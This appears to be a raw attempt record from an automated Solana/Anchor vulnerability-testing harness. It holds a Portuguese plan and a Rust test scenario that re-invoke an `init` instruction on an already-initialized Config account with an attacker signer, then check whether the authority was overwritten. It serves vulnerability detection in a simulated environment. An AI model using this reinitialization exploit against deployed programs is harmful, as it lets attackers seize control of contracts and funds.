attempts.raw:
{
  "plan": "O programa-alvo tem uma instrucao `init` que recebe uma conta `Config` mutavel (sem `init` do Anchor) e um `authority` signer. O baseline chama `init` legitimamente com uma conta Config recem-criada (dados zerados, is_initialized=false), o que deve ter sucesso e gravar authority/is_initialized=true/vault_balance=0. O ataque reutiliza a mesma instrucao `init` sobre a conta Config ja inicializada (estado vindo de resulting_accounts do baseline), tentando re-inicializa-la. O efeito medido e que apos o ataque a conta Config continua com is_initialized=true e authority sobrescrito pelo atacante, demonstrando reinitialization bem-sucedida.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

let config_key = Pubkey::new_unique();

// Conta Config ainda nao inicializada (dados zerados), dona do programa.
let config_data = anchor_account_data("Config", &(Pubkey::default(), false, 0u64));
let config_acc = account(&env.program_id, &config_data, None);

let metas = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(authority, true),
];
let contas = vec![
    (config_key, config_acc.clone()),
    (authority, wallet(1_000_000_000)),
];

let ix = env.anchor_ix("init", &(), metas.clone());
let base = env.baseline("init legitimo em conta nao inicializada", &ix, &contas);

// Estado apos o baseline: conta Config inicializada com authority legitima.
let mut config_pos = config_acc.clone();
for (k, a) in base.resulting_accounts.iter() {
    if *k == config_key {
        config_pos = a.clone();
    }
}

// Ataque: chamar init de novo sobre a conta ja inicializada, com authority atacante.
let metas_ataque = vec![
    AccountMeta::new(config_key, false),
    AccountMeta::new_readonly(attacker, true),
];
let contas_ataque = vec![
    (config_key, config_pos.clone()),
    (attacker, wallet(1_000_000_000)),
];
let ix_ataque = env.anchor_ix("init", &(), metas_ataque);
let r = env.attack("reinit: chamar init sobre conta ja inicializada", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let dados = after(&r, &config_key).data();
    let auth_pos = read_pubkey(dados, 8);
    let is_init = dados[40] != 0;
    env.effect(
        "conta Config re-inicializada: authority sobrescrita pelo atacante",
        auth_pos == attacker && is_init,
    );
}"
}

